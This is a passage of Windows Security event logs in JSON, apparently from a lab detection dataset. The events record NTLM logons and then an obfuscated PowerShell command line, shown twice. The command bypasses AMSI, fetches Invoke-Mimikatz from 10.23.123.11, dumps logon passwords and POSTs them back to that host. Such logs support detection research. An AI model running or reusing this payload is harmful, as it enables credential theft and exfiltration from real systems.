{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4624,"Version":1,"Level":0,"Task":12544,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.059154Z"},"EventRecordID":937758,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":1056},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-0-0","SubjectUserName":"-","SubjectDomainName":"-","SubjectLogonId":"0x0","TargetUserSid":"S-1-5-7","TargetUserName":"ANONYMOUS LOGON","TargetDomainName":"NT AUTHORITY","TargetLogonId":"0x8157add","LogonType":3,"LogonProcessName":"NtLmSsp ","AuthenticationPackageName":"NTLM","WorkstationName":"","LogonGuid":"00000000-0000-0000-0000-000000000000","TransmittedServices":"-","LmPackageName":"NTLM V1","KeyLength":0,"ProcessId":"0x0","ProcessName":"-","IpAddress":"10.23.123.11","IpPort":"54388","ImpersonationLevel":"%%1833"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4624,"Version":1,"Level":0,"Task":12544,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.121650Z"},"EventRecordID":937761,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":1056},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-0-0","SubjectUserName":"-","SubjectDomainName":"-","SubjectLogonId":"0x0","TargetUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","TargetUserName":"admmig","TargetDomainName":"OFFSEC","TargetLogonId":"0x8157afc","LogonType":3,"LogonProcessName":"NtLmSsp ","AuthenticationPackageName":"NTLM","WorkstationName":"","LogonGuid":"00000000-0000-0000-0000-000000000000","TransmittedServices":"-","LmPackageName":"NTLM V2","KeyLength":0,"ProcessId":"0x0","ProcessName":"-","IpAddress":"10.23.123.11","IpPort":"54392","ImpersonationLevel":"%%1833"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4624,"Version":1,"Level":0,"Task":12544,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.137273Z"},"EventRecordID":937764,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":1056},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-0-0","SubjectUserName":"-","SubjectDomainName":"-","SubjectLogonId":"0x0","TargetUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","TargetUserName":"admmig","TargetDomainName":"OFFSEC","TargetLogonId":"0x8157b29","LogonType":3,"LogonProcessName":"NtLmSsp ","AuthenticationPackageName":"NTLM","WorkstationName":"","LogonGuid":"00000000-0000-0000-0000-000000000000","TransmittedServices":"-","LmPackageName":"NTLM V2","KeyLength":0,"ProcessId":"0x0","ProcessName":"-","IpAddress":"10.23.123.11","IpPort":"54394","ImpersonationLevel":"%%1833"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.152903Z"},"EventRecordID":937767,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157b29","ObjectServer":"SC Manager","ObjectType":"SC_MANAGER OBJECT","ObjectName":"ServicesActive","HandleId":"0xffffd000f46659f8","AccessMask":"%%1537\r\n\t\t\t\t%%1538\r\n\t\t\t\t%%1539\r\n\t\t\t\t%%7168\r\n\t\t\t\t%%7169\r\n\t\t\t\t%%7170\r\n\t\t\t\t%%7171\r\n\t\t\t\t%%7172\r\n\t\t\t\t%%7173\r\n\t\t\t\t","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x1d8","ProcessName":"C:\\Windows\\System32\\services.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4624,"Version":1,"Level":0,"Task":12544,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.168537Z"},"EventRecordID":937770,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":1056},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-0-0","SubjectUserName":"-","SubjectDomainName":"-","SubjectLogonId":"0x0","TargetUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","TargetUserName":"admmig","TargetDomainName":"OFFSEC","TargetLogonId":"0x8157b4e","LogonType":3,"LogonProcessName":"NtLmSsp ","AuthenticationPackageName":"NTLM","WorkstationName":"","LogonGuid":"00000000-0000-0000-0000-000000000000","TransmittedServices":"-","LmPackageName":"NTLM V2","KeyLength":128,"ProcessId":"0x0","ProcessName":"-","IpAddress":"10.23.123.11","IpPort":"60238","ImpersonationLevel":"%%1833"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4624,"Version":1,"Level":0,"Task":12544,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.246658Z"},"EventRecordID":937773,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":1056},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-0-0","SubjectUserName":"-","SubjectDomainName":"-","SubjectLogonId":"0x0","TargetUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","TargetUserName":"admmig","TargetDomainName":"OFFSEC","TargetLogonId":"0x8157b70","LogonType":3,"LogonProcessName":"NtLmSsp ","AuthenticationPackageName":"NTLM","WorkstationName":"","LogonGuid":"00000000-0000-0000-0000-000000000000","TransmittedServices":"-","LmPackageName":"NTLM V2","KeyLength":128,"ProcessId":"0x0","ProcessName":"-","IpAddress":"10.23.123.11","IpPort":"48446","ImpersonationLevel":"%%1833"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4624,"Version":1,"Level":0,"Task":12544,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.309160Z"},"EventRecordID":937776,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":1056},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-0-0","SubjectUserName":"-","SubjectDomainName":"-","SubjectLogonId":"0x0","TargetUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","TargetUserName":"admmig","TargetDomainName":"OFFSEC","TargetLogonId":"0x8157b8f","LogonType":3,"LogonProcessName":"NtLmSsp ","AuthenticationPackageName":"NTLM","WorkstationName":"","LogonGuid":"00000000-0000-0000-0000-000000000000","TransmittedServices":"-","LmPackageName":"NTLM V2","KeyLength":128,"ProcessId":"0x0","ProcessName":"-","IpAddress":"10.23.123.11","IpPort":"48446","ImpersonationLevel":"%%1833"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4624,"Version":1,"Level":0,"Task":12544,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.371666Z"},"EventRecordID":937779,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":1056},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-0-0","SubjectUserName":"-","SubjectDomainName":"-","SubjectLogonId":"0x0","TargetUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","TargetUserName":"admmig","TargetDomainName":"OFFSEC","TargetLogonId":"0x8157bac","LogonType":3,"LogonProcessName":"NtLmSsp ","AuthenticationPackageName":"NTLM","WorkstationName":"","LogonGuid":"00000000-0000-0000-0000-000000000000","TransmittedServices":"-","LmPackageName":"NTLM V2","KeyLength":128,"ProcessId":"0x0","ProcessName":"-","IpAddress":"10.23.123.11","IpPort":"48446","ImpersonationLevel":"%%1833"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.635987Z"},"EventRecordID":937780,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":2664},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-20","SubjectUserName":"FS03VULN$","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x3e4","NewProcessId":"0x108","NewProcessName":"C:\\Windows\\System32\\cmd.exe","TokenElevationType":"%%1936","ProcessId":"0x5e4","CommandLine":"cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C \" & ( $pSHomE[4]+$pshome[30]+'x')(\"$( seT-VariaBLe 'OFs'  '') \"+[sTRING]((91 ,78,101 ,116, 46, 83, 101 ,114, 118, 105,99 , 101,80 , 111,105,110 ,116,77,97,110, 97,103,101,114,93,58, 58 , 83 ,101, 114, 118, 101 ,114, 67,101,114 , 116 , 105,102 , 105 ,99, 97 ,116 , 101,86,97 ,108,105 ,100 , 97, 116, 105 ,111 ,110 , 67, 97 , 108 ,108 , 98,97 , 99 ,107,32 ,61, 32 ,123,36 ,116,114 , 117,101 ,125 , 10,116 , 114 , 121, 123 ,10 , 91 , 82 ,101, 102 ,93,46 ,65 ,115, 115, 101,109, 98 , 108 ,121,46,71, 101 , 116,84 , 121 ,112, 101,40 ,39 ,83 ,121, 115,39, 43, 39 ,116,101,109 , 46 , 77 ,97,110 , 39 , 43 , 39,97, 103 , 101,109 , 101,110 ,116 , 46 , 65, 117, 116 , 39, 43,39,111 ,109,97 ,116,105, 111, 110,46 ,65, 109,39,43,39 , 115, 105 ,85 ,116 , 39 ,43 , 39 , 105 ,108,115 , 39, 41, 46 ,71 ,101,116 ,70 , 105 , 101, 108 , 100,40,39 ,97 , 109, 39 ,43, 39 ,115,105,73,110 ,105, 39, 43, 39, 116 ,70 ,97 ,105 ,108 ,101, 100,39,44, 32 ,39 , 78 ,111, 110 , 80 , 39,43,39 , 117 ,98, 108 ,105,99 , 44 , 83, 116 , 97 ,39,43,39 ,116 , 105 , 99 ,39,41,46 ,83,101 ,116,86,97, 108 , 117 ,101 , 40 ,36, 110 , 117,108,108,44 ,32 ,36 ,116 ,114,117,101,41, 10 ,125 , 99 ,97, 116, 99,104 ,123,125 , 10 ,91, 78 ,101, 116, 46, 83 , 101,114,118,105 , 99, 101 ,80 ,111 ,105 , 110 ,116 , 77 , 97,110, 97 , 103, 101 , 114, 93 ,58 , 58, 83 ,101,114 , 118 , 101, 114 ,67,101,114,116,105 , 102, 105,99 , 97 , 116,101 , 86 , 97 , 108,105, 100,97,116 ,105 ,111 ,110,67 ,97 ,108, 108,98, 97,99 ,107, 32,61, 32, 123,36,116,114 ,117 , 101 ,125,10, 91 , 83 ,121 , 115 ,116, 101 , 109 ,46 ,78, 101 ,116,46,83, 101 ,114, 118 ,105, 99, 101 , 80,111 , 105 ,110 ,116, 77, 97,110 ,97 ,103,101,114 ,93, 58,58, 83 ,101,99 , 117 ,114 , 105, 116 , 121 , 80,114 , 111 ,116 ,111 ,99 , 111,108 , 32 , 61 , 32,91 ,83 , 121 , 115, 116, 101, 109,46,78, 101, 116 ,46 ,83 ,101 , 99 , 117,114,105, 116 ,121,80 , 114 ,111 , 116, 111,99, 111,108,84, 121,112, 101 , 93,39 , 83 , 115 , 108 ,51 , 44 ,84 ,108,115, 44 ,84, 108,115, 49,49 , 44, 84,108 , 115 ,49, 50, 39,10, 73,69 ,88, 32 , 40, 78,101 , 119 , 45 ,79, 98, 106 , 101 , 99 , 116, 32 ,78,101 ,116 , 46,87 , 101,98 , 67, 108 , 105 ,101,110,116,41,46,68 , 111, 119,110 ,108 , 111 ,97,100 ,83 , 116 , 114, 105 , 110, 103,40 ,39,104 ,116,116, 112 ,115, 58,47 , 47 ,49, 48,46 ,50,51 ,46 , 49, 50 ,51, 46,49, 49 ,58 , 50 ,54 ,50, 54 , 47 , 73 ,110, 118 , 111, 107 ,101,45,77 , 105 ,109, 105 , 107, 97 , 116 , 122, 46 ,112,115, 49 ,39, 41,10, 36 ,99 ,109 ,100 ,32,61,32,73, 110 , 118,111, 107, 101 ,45 , 77, 105, 109 ,105, 107 , 97, 116,122 ,32 ,45, 67,111, 109 ,109 ,97 ,110,100, 32,39 ,112,114 ,105, 118, 105,108 , 101, 103,101,58 ,58,100 ,101 , 98,117,103 ,32,115,101,107,117 ,114,108 ,115 ,97 ,58 , 58 , 108, 111 ,103, 111,110, 112 ,97,115 , 115 , 119,111, 114,100 , 115 , 32 , 101, 120 ,105 , 116,39,10 , 36, 114,101 ,113 ,117 , 101, 115 , 116,32,61, 32 , 91 ,83 , 121 , 115,116 ,101, 109 , 46,78, 101,116, 46 ,87,101,98,82,101 , 113 ,117,101 , 115 ,116 ,93, 58 , 58 , 67,114 ,101, 97 , 116, 101 , 40 ,39 ,104,116 ,116 , 112 ,115, 58 , 47 , 47, 49,48 ,46, 50 , 51 , 46 ,49, 50 , 51, 46,49 ,49, 58 , 50,54 , 50,54 , 47 ,39, 41,10 ,36 ,114, 101, 113,117,101 ,115,116 , 46,77, 101,116,104 , 111 , 100 , 32 , 61, 32,39 , 80, 79 , 83,84,39 ,10 , 36 ,114 , 101, 113 , 117 , 101 ,115,116 , 46 ,67,111, 110 , 116, 101, 110,116 ,84,121, 112,101,32 , 61 , 32 ,39 ,97 ,112 ,112 ,108 , 105 , 99,97 , 116, 105 ,111 , 110, 47, 120,45 , 119, 119 , 119 ,45 ,102,111, 114 ,109 ,45,117, 114, 108 , 101 ,110 ,99 , 111,100 , 101 ,100 , 39,10,36,98,121, 116, 101, 115 , 32 , 61 ,32 , 91 , 83, 121 , 115, 116,101 , 109 , 46, 84 ,101, 120 ,116 , 46, 69 , 110, 99 , 111 , 100 ,105 ,110 ,103,93 , 58 ,58, 65 , 83, 67, 73 , 73 , 46 ,71, 101 ,116 ,66 , 121 , 116,101 , 115 , 40 ,36 ,99 , 109 , 100, 41, 10, 36 , 114, 101, 113, 117 , 101, 115, 116, 46, 67 , 111, 110 ,116, 101,110 , 116 , 76, 101, 110,103,116 , 104 , 32, 61 ,32, 36 ,98 ,121,116, 101 ,115 ,46, 76, 101,110,103 ,116, 104,10, 36, 114 , 101, 113 , 117 ,101, 115, 116,83,116 ,114 ,101,97, 109 , 32,61 , 32 ,36, 114,101 ,113 , 117 , 101 , 115 , 116,46 , 71, 101, 116,82,101,113 ,117,101, 115 ,116 ,83, 116,114, 101, 97,109 , 40,41, 10, 36,114 , 101 , 113, 117, 101 ,115 , 116 , 83,116 ,114 , 101 , 97 ,109 , 46, 87,114 ,105 ,116,101,40,36 , 98 , 121 ,116 , 101 , 115 ,44,32 ,48 ,44, 32, 36 ,98, 121,116,101 ,115 , 46, 76 , 101,110 ,103,116, 104, 41 , 10 , 36,114,101,113 , 117,101 , 115, 116,83,116,114 , 101, 97 , 109 , 46,67, 108,111 ,115,101 , 40 ,41 , 10 , 36, 114 ,101, 113, 117, 101,115 , 116 , 46, 71 , 101 ,116,82 ,101 , 115, 112 ,111 , 110,115,101, 40 ,41) | % { ( [ChaR][InT]$_) } ) +\"$(sEt-iTeM  'vArIaBLE:ofS'  ' ' ) \" ) \""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.635987Z"},"EventRecordID":937781,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":2664},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","NewProcessId":"0xfdc","NewProcessName":"C:\\Windows\\System32\\conhost.exe","TokenElevationType":"%%1936","ProcessId":"0x108","CommandLine":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.635987Z"},"EventRecordID":937782,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"File","ObjectName":"\\Device\\ConDrv","HandleId":"0x4","AccessMask":"%%1537\r\n\t\t\t\t%%1538\r\n\t\t\t\t%%1539\r\n\t\t\t\t%%1540\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4416\r\n\t\t\t\t%%4417\r\n\t\t\t\t%%4418\r\n\t\t\t\t%%4419\r\n\t\t\t\t%%4420\r\n\t\t\t\t%%4421\r\n\t\t\t\t%%4422\r\n\t\t\t\t%%4423\r\n\t\t\t\t%%4424\r\n\t\t\t\t","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0xfdc","ProcessName":"C:\\Windows\\System32\\conhost.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.651484Z"},"EventRecordID":937783,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":2664},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","NewProcessId":"0x90c","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TokenElevationType":"%%1936","ProcessId":"0x108","CommandLine":"powershell.exe  -exec bypass -noni -nop -w 1 -C \" & ( $pSHomE[4]+$pshome[30]+'x')(\"$( seT-VariaBLe 'OFs'  '') \"+[sTRING]((91 ,78,101 ,116, 46, 83, 101 ,114, 118, 105,99 , 101,80 , 111,105,110 ,116,77,97,110, 97,103,101,114,93,58, 58 , 83 ,101, 114, 118, 101 ,114, 67,101,114 , 116 , 105,102 , 105 ,99, 97 ,116 , 101,86,97 ,108,105 ,100 , 97, 116, 105 ,111 ,110 , 67, 97 , 108 ,108 , 98,97 , 99 ,107,32 ,61, 32 ,123,36 ,116,114 , 117,101 ,125 , 10,116 , 114 , 121, 123 ,10 , 91 , 82 ,101, 102 ,93,46 ,65 ,115, 115, 101,109, 98 , 108 ,121,46,71, 101 , 116,84 , 121 ,112, 101,40 ,39 ,83 ,121, 115,39, 43, 39 ,116,101,109 , 46 , 77 ,97,110 , 39 , 43 , 39,97, 103 , 101,109 , 101,110 ,116 , 46 , 65, 117, 116 , 39, 43,39,111 ,109,97 ,116,105, 111, 110,46 ,65, 109,39,43,39 , 115, 105 ,85 ,116 , 39 ,43 , 39 , 105 ,108,115 , 39, 41, 46 ,71 ,101,116 ,70 , 105 , 101, 108 , 100,40,39 ,97 , 109, 39 ,43, 39 ,115,105,73,110 ,105, 39, 43, 39, 116 ,70 ,97 ,105 ,108 ,101, 100,39,44, 32 ,39 , 78 ,111, 110 , 80 , 39,43,39 , 117 ,98, 108 ,105,99 , 44 , 83, 116 , 97 ,39,43,39 ,116 , 105 , 99 ,39,41,46 ,83,101 ,116,86,97, 108 , 117 ,101 , 40 ,36, 110 , 117,108,108,44 ,32 ,36 ,116 ,114,117,101,41, 10 ,125 , 99 ,97, 116, 99,104 ,123,125 , 10 ,91, 78 ,101, 116, 46, 83 , 101,114,118,105 , 99, 101 ,80 ,111 ,105 , 110 ,116 , 77 , 97,110, 97 , 103, 101 , 114, 93 ,58 , 58, 83 ,101,114 , 118 , 101, 114 ,67,101,114,116,105 , 102, 105,99 , 97 , 116,101 , 86 , 97 , 108,105, 100,97,116 ,105 ,111 ,110,67 ,97 ,108, 108,98, 97,99 ,107, 32,61, 32, 123,36,116,114 ,117 , 101 ,125,10, 91 , 83 ,121 , 115 ,116, 101 , 109 ,46 ,78, 101 ,116,46,83, 101 ,114, 118 ,105, 99, 101 , 80,111 , 105 ,110 ,116, 77, 97,110 ,97 ,103,101,114 ,93, 58,58, 83 ,101,99 , 117 ,114 , 105, 116 , 121 , 80,114 , 111 ,116 ,111 ,99 , 111,108 , 32 , 61 , 32,91 ,83 , 121 , 115, 116, 101, 109,46,78, 101, 116 ,46 ,83 ,101 , 99 , 117,114,105, 116 ,121,80 , 114 ,111 , 116, 111,99, 111,108,84, 121,112, 101 , 93,39 , 83 , 115 , 108 ,51 , 44 ,84 ,108,115, 44 ,84, 108,115, 49,49 , 44, 84,108 , 115 ,49, 50, 39,10, 73,69 ,88, 32 , 40, 78,101 , 119 , 45 ,79, 98, 106 , 101 , 99 , 116, 32 ,78,101 ,116 , 46,87 , 101,98 , 67, 108 , 105 ,101,110,116,41,46,68 , 111, 119,110 ,108 , 111 ,97,100 ,83 , 116 , 114, 105 , 110, 103,40 ,39,104 ,116,116, 112 ,115, 58,47 , 47 ,49, 48,46 ,50,51 ,46 , 49, 50 ,51, 46,49, 49 ,58 , 50 ,54 ,50, 54 , 47 , 73 ,110, 118 , 111, 107 ,101,45,77 , 105 ,109, 105 , 107, 97 , 116 , 122, 46 ,112,115, 49 ,39, 41,10, 36 ,99 ,109 ,100 ,32,61,32,73, 110 , 118,111, 107, 101 ,45 , 77, 105, 109 ,105, 107 , 97, 116,122 ,32 ,45, 67,111, 109 ,109 ,97 ,110,100, 32,39 ,112,114 ,105, 118, 105,108 , 101, 103,101,58 ,58,100 ,101 , 98,117,103 ,32,115,101,107,117 ,114,108 ,115 ,97 ,58 , 58 , 108, 111 ,103, 111,110, 112 ,97,115 , 115 , 119,111, 114,100 , 115 , 32 , 101, 120 ,105 , 116,39,10 , 36, 114,101 ,113 ,117 , 101, 115 , 116,32,61, 32 , 91 ,83 , 121 , 115,116 ,101, 109 , 46,78, 101,116, 46 ,87,101,98,82,101 , 113 ,117,101 , 115 ,116 ,93, 58 , 58 , 67,114 ,101, 97 , 116, 101 , 40 ,39 ,104,116 ,116 , 112 ,115, 58 , 47 , 47, 49,48 ,46, 50 , 51 , 46 ,49, 50 , 51, 46,49 ,49, 58 , 50,54 , 50,54 , 47 ,39, 41,10 ,36 ,114, 101, 113,117,101 ,115,116 , 46,77, 101,116,104 , 111 , 100 , 32 , 61, 32,39 , 80, 79 , 83,84,39 ,10 , 36 ,114 , 101, 113 , 117 , 101 ,115,116 , 46 ,67,111, 110 , 116, 101, 110,116 ,84,121, 112,101,32 , 61 , 32 ,39 ,97 ,112 ,112 ,108 , 105 , 99,97 , 116, 105 ,111 , 110, 47, 120,45 , 119, 119 , 119 ,45 ,102,111, 114 ,109 ,45,117, 114, 108 , 101 ,110 ,99 , 111,100 , 101 ,100 , 39,10,36,98,121, 116, 101, 115 , 32 , 61 ,32 , 91 , 83, 121 , 115, 116,101 , 109 , 46, 84 ,101, 120 ,116 , 46, 69 , 110, 99 , 111 , 100 ,105 ,110 ,103,93 , 58 ,58, 65 , 83, 67, 73 , 73 , 46 ,71, 101 ,116 ,66 , 121 , 116,101 , 115 , 40 ,36 ,99 , 109 , 100, 41, 10, 36 , 114, 101, 113, 117 , 101, 115, 116, 46, 67 , 111, 110 ,116, 101,110 , 116 , 76, 101, 110,103,116 , 104 , 32, 61 ,32, 36 ,98 ,121,116, 101 ,115 ,46, 76, 101,110,103 ,116, 104,10, 36, 114 , 101, 113 , 117 ,101, 115, 116,83,116 ,114 ,101,97, 109 , 32,61 , 32 ,36, 114,101 ,113 , 117 , 101 , 115 , 116,46 , 71, 101, 116,82,101,113 ,117,101, 115 ,116 ,83, 116,114, 101, 97,109 , 40,41, 10, 36,114 , 101 , 113, 117, 101 ,115 , 116 , 83,116 ,114 , 101 , 97 ,109 , 46, 87,114 ,105 ,116,101,40,36 , 98 , 121 ,116 , 101 , 115 ,44,32 ,48 ,44, 32, 36 ,98, 121,116,101 ,115 , 46, 76 , 101,110 ,103,116, 104, 41 , 10 , 36,114,101,113 , 117,101 , 115, 116,83,116,114 , 101, 97 , 109 , 46,67, 108,111 ,115,101 , 40 ,41 , 10 , 36, 114 ,101, 113, 117, 101,115 , 116 , 46, 71 , 101 ,116,82 ,101 , 115, 112 ,111 , 110,115,101, 40 ,41) | % { ( [ChaR][InT]$_) } ) +\"$(sEt-iTeM  'vArIaBLE:ofS'  ' ' ) \" ) \""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.667108Z"},"EventRecordID":937784,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"Token","ObjectName":"","HandleId":"0x16c","AccessMask":"%%1537\r\n\t\t\t\t%%1538\r\n\t\t\t\t%%1539\r\n\t\t\t\t%%1540\r\n\t\t\t\t%%4592\r\n\t\t\t\t%%4593\r\n\t\t\t\t%%4594\r\n\t\t\t\t%%4595\r\n\t\t\t\t%%4596\r\n\t\t\t\t%%4597\r\n\t\t\t\t%%4598\r\n\t\t\t\t%%4599\r\n\t\t\t\t%%4600\r\n\t\t\t\t","PrivilegeList":"SeTakeOwnershipPrivilege","ProcessId":"0x90c","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4674,"Version":0,"Level":0,"Task":13056,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2021-11-23T09:26:30.698359Z"},"EventRecordID":937785,"Correlation":null,"Execution_attributes":{"ProcessID":480,"ThreadID":488},"Channel":"Security","Computer":"fs03vuln.offsec.lan","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-4230534742-2542757381-3142984815-1111","SubjectUserName":"admmig","SubjectDomainName":"OFFSEC","SubjectLogonId":"0x8157bac","ObjectServer":"Security","ObjectType":"File","ObjectName":"C:\\Users\\admmig\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\590aee7bdd69b59b.customDestinations-ms","HandleId":"0x214","AccessMask":"%%1537\r\n\t\t\t\t%%1538\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%1542\r\n\t\t\t\t